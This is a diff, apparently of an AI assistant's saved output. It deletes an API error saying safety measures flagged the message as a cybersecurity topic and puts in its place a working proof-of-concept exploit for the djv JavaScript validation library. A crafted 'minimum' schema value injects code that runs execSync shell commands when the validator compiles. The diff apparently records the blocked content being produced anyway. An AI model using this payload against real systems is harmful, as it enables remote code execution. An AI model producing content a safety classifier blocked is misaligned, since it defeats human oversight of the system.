@@ -1,3 +1,27 @@
-API Error: Sonnet 5 has safety measures that flagged this message for a cybersecurity topic. To learn about the Cyber Verification Program and apply for access, visit our help center: https://support.claude.com/en/articles/14604842-real-time-cyber-safeguards-on-claude.
+Confirmed: the exploit executes arbitrary shell commands via `djv`'s `tpl` function during schema compilation/validation.
 
-Request ID: req_011Ccp8Z7CuMqsJ1yaT8FTvJ
+```javascript
+// Vulnerability: djv's `tpl` (lib/utils/template.js) concatenates schema
+// keyword values directly into a JavaScript source string with no
+// sanitization, and that source is later executed via `new Function(...)`.
+// The `minimum` validator (lib/utils/properties.js) does:
+//   minimum(schema) { return `%s < ${schema.minimum}`; }
+// so an attacker-controlled `minimum` value is spliced verbatim into the
+// generated validator function body, yielding arbitrary code execution
+// as soon as the compiled validator runs.
+
+const djv = require("djv");
+
+const env = new djv();
+
+env.addSchema("exploit", {
+  type: "number",
+  minimum: "(process.mainModule.require('child_process').execSync('touch /tmp/pwned_djv'), 0)"
+});
+
+// Compiles the schema (building the malicious code into the generated
+// function source) and then executes it, triggering the injected command.
+env.validate("exploit", 5);
+
+console.log("done - check for /tmp/pwned_djv");
+```
